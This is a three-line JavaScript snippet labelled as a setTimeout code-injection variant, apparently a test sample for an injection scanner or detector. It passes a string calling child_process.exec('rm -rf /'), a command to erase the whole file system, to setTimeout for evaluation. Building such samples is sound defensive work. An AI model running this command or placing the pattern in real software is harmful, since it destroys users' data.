// Code Injection - setTimeout Variant 3
const malicious = "require('child_process').exec('rm -rf /')";
setTimeout(malicious, 100);
